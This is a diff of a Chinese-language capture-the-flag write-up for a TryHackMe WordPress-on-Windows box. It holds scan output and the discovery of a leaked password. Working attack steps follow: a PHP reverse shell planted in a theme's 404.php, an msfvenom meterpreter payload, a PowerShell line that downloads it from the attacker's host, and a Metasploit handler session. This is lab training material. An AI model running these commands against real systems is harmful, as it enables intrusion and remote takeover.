@@ -4,10 +4,10 @@
 # 服务发现
 ```
 ┌──(root💀kali)-[~/tryhackme]
-└─# nmap -sV -Pn 10.10.207.255    
+└─# nmap -sV -Pn 10.10.80.159    
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-05 05:03 EDT
-Nmap scan report for 10.10.207.255
+Nmap scan report for 10.10.80.159
 Host is up (0.30s latency).
 Not shown: 998 filtered ports
 PORT     STATE SERVICE       VERSION
@@ -26,21 +26,21 @@ Nmap done: 1 IP address (1 host up) scanned in 32.16 seconds
 # 爆破目录
 ```
 ┌──(root💀kali)-[~/dirsearch]
-└─# python3 dirsearch.py -e* -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.207.255
+└─# python3 dirsearch.py -e* -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.80.159
 
   _|. _ _  _  _  _ _|_    v0.4.2
  (_||| _) (/_(_|| (_| )
 
 Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 220545
 
-Output File: /root/dirsearch/reports/10.10.207.255/_21-11-05_05-03-57.txt
+Output File: /root/dirsearch/reports/10.10.80.159/_21-11-05_05-03-57.txt
 
 Error Log: /root/dirsearch/logs/errors-21-11-05_05-03-57.log
 
-Target: http://10.10.207.255/
+Target: http://10.10.80.159/
 
 [05:03:57] Starting: 
-[05:04:35] 301 -  150B  - /retro  ->  http://10.10.207.255/retro/  
+[05:04:35] 301 -  150B  - /retro  ->  http://10.10.80.159/retro/  
 ```
 
 扫到一个目录，浏览了一下，是一个wordpress网站
@@ -49,23 +49,23 @@ Target: http://10.10.207.255/
 ## wp目录爆破
 ```
 ┌──(root💀kali)-[~/dirsearch]
-└─# python3 dirsearch.py -e* -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.207.255/retro
+└─# python3 dirsearch.py -e* -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.80.159/retro
 
   _|. _ _  _  _  _ _|_    v0.4.2
  (_||| _) (/_(_|| (_| )
 
 Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 220545
 
-Output File: /root/dirsearch/reports/10.10.207.255/-retro_21-11-05_05-08-12.txt
+Output File: /root/dirsearch/reports/10.10.80.159/-retro_21-11-05_05-08-12.txt
 
 Error Log: /root/dirsearch/logs/errors-21-11-05_05-08-12.log
 
-Target: http://10.10.207.255/retro/
+Target: http://10.10.80.159/retro/
 
 [05:08:14] Starting: 
-[05:08:21] 301 -  161B  - /retro/wp-content  ->  http://10.10.207.255/retro/wp-content/
-[05:08:24] 301 -  162B  - /retro/wp-includes  ->  http://10.10.207.255/retro/wp-includes/
-[05:09:04] 301 -  159B  - /retro/wp-admin  ->  http://10.10.207.255/retro/wp-admin/
+[05:08:21] 301 -  161B  - /retro/wp-content  ->  http://10.10.80.159/retro/wp-content/
+[05:08:24] 301 -  162B  - /retro/wp-includes  ->  http://10.10.80.159/retro/wp-includes/
+[05:09:04] 301 -  159B  - /retro/wp-admin  ->  http://10.10.80.159/retro/wp-admin/
 
 ```
 
@@ -74,7 +74,7 @@ Target: http://10.10.207.255/retro/
 ## wp信息枚举
 确认wp版本为:5.2.1
 ```
-└─# wpscan --url http://10.10.207.255/retro    
+└─# wpscan --url http://10.10.80.159/retro    
 
 _______________________________________________________________
          __          _______   _____
@@ -92,7 +92,7 @@ _______________________________________________________________
 
 [i] It seems like you have not updated the database for some time.
 [?] Do you want to update now? [Y]es [N]o, default: [N]n
-[+] URL: http://10.10.207.255/retro/ [10.10.207.255]
+[+] URL: http://10.10.80.159/retro/ [10.10.80.159]
 [+] Started: Fri Nov  5 05:09:28 2021
 
 Interesting Finding(s):
@@ -104,7 +104,7 @@ Interesting Finding(s):
  | Found By: Headers (Passive Detection)
  | Confidence: 100%
 
-[+] XML-RPC seems to be enabled: http://10.10.207.255/retro/xmlrpc.php
+[+] XML-RPC seems to be enabled: http://10.10.80.159/retro/xmlrpc.php
  | Found By: Direct Access (Aggressive Detection)
  | Confidence: 100%
  | References:
@@ -114,11 +114,11 @@ Interesting Finding(s):
  |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
  |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
 
-[+] WordPress readme found: http://10.10.207.255/retro/readme.html
+[+] WordPress readme found: http://10.10.80.159/retro/readme.html
  | Found By: Direct Access (Aggressive Detection)
  | Confidence: 100%
 
-[+] The external WP-Cron seems to be enabled: http://10.10.207.255/retro/wp-cron.php
+[+] The external WP-Cron seems to be enabled: http://10.10.80.159/retro/wp-cron.php
  | Found By: Direct Access (Aggressive Detection)
  | Confidence: 60%
  | References:
@@ -127,15 +127,15 @@ Interesting Finding(s):
 
 [+] WordPress version 5.2.1 identified (Insecure, released on 2019-05-21).
  | Found By: Rss Generator (Passive Detection)
- |  - http://10.10.207.255/retro/index.php/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>
- |  - http://10.10.207.255/retro/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>
+ |  - http://10.10.80.159/retro/index.php/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>
+ |  - http://10.10.80.159/retro/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>
 
 [+] WordPress theme in use: 90s-retro
- | Location: http://10.10.207.255/retro/wp-content/themes/90s-retro/
+ | Location: http://10.10.80.159/retro/wp-content/themes/90s-retro/
  | Latest Version: 1.4.10 (up to date)
  | Last Updated: 2019-04-15T00:00:00.000Z
- | Readme: http://10.10.207.255/retro/wp-content/themes/90s-retro/readme.txt
- | Style URL: http://10.10.207.255/retro/wp-content/themes/90s-retro/style.css?ver=5.2.1
+ | Readme: http://10.10.80.159/retro/wp-content/themes/90s-retro/readme.txt
+ | Style URL: http://10.10.80.159/retro/wp-content/themes/90s-retro/style.css?ver=5.2.1
  | Style Name: 90s Retro
  | Style URI: https://organicthemes.com/retro-theme/
  | Description: Have you ever wished your WordPress blog looked like an old Geocities site from the 90s!? Probably n...
@@ -146,7 +146,7 @@ Interesting Finding(s):
  |
  | Version: 1.4.10 (80% confidence)
  | Found By: Style (Passive Detection)
- |  - http://10.10.207.255/retro/wp-content/themes/90s-retro/style.css?ver=5.2.1, Match: 'Version: 1.4.10'
+ |  - http://10.10.80.159/retro/wp-content/themes/90s-retro/style.css?ver=5.2.1, Match: 'Version: 1.4.10'
 
 [+] Enumerating All Plugins (via Passive Methods)
 
@@ -209,7 +209,7 @@ Shellcodes: No Results
  | Found By: Author Posts - Author Pattern (Passive Detection)
  | Confirmed By:
  |  Wp Json Api (Aggressive Detection)
- |   - http://10.10.207.255/retro/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |   - http://10.10.80.159/retro/index.php/wp-json/wp/v2/users/?per_page=100&page=1
  |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
  |  Login Error Messages (Aggressive Detection)
 
@@ -235,7 +235,95 @@ I can’t believe the movie based on my favorite book of all time is going to co
 
 Ready Player One就是电源《头号玩家》，
 
+至少我们现在知道作者常常会搞混自己和角色的名字，这个电影主角的名字叫：```wade```
 
-wpscan --url http://10.10.207.255/retro -P /usr/share/wordlists/rockyou.txt  -U wade 
 
-wpscan --url http://10.10.207.255/retro -P /usr/share/wordlists/rockyou.txt  -U Wade 
+在这条post的comment下面，作者泄露了自己的密码```parzival```:
+```
+Wade
+December 9, 2019
+
+Leaving myself a note here just in case I forget how to spell it: parzival
+```
+
+因为系统开了3389服务，用```wade:parzival```远程桌面到靶机拿到user.txt
+
+> xfreerdp /u:wade /v:10.10.80.159
+
+同时我们可以用上面的凭证登录wordpress
+wordpress的渗透套路是，一旦得到了管理员的登录账户就去到```Appearance->Theme Edlitor```里编辑源代码
+
+我一般把webshell写到```404.php```这个页面，然后在前台访问一个不存在的页面，触发反弹shell
+
+我们把[windows版本reverse_shell](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/php_reverse_shell.php)写到404.php，拿到webshell
+```
+┌──(root💀kali)-[~/tryhackme]
+└─# nc -nlvp 4242                
+listening on [any] 4242 ...
+connect to [10.13.21.169] from (UNKNOWN) [10.10.80.159] 49792
+SOCKET: Shell has connected! PID: 3436
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\inetpub\wwwroot\retro>whoami
+iis apppool\retro
+
+```
+
+
+我们用msfvenom生成一个稳定的shell
+> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.13.21.169 LPORT=4444 -f exe > shell_64.exe
+
+用webshell上传到靶机
+> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.13.21.169:8000/shell_64.exe','C:\users\public\Downloads\shell_64.exe')"
+把nc和wget下载到靶机，以便后续渗透使用,经测试```C:\users\public\Downloads```是可写的：
+
+
+在远程桌面，用wade的账号点击```shell_64.exe```，收到wade的反弹shell
+
+```
+msf6 exploit(windows/local/bypassuac_sdclt) > use exploit/multi/handler 
+[*] Using configured payload windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     tun0             yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.13.21.169:4444 
+[*] Sending stage (200262 bytes) to 10.10.80.159
+[*] Meterpreter session 3 opened (10.13.21.169:4444 -> 10.10.80.159:50582) at 2021-11-22 05:48:04 -0500
+
+meterpreter > getuid
+Server username: RETROWEB\Wade
+
+```
+
+
+
+
+
+.\winPEASx64.exe >o.txt
+
+
+
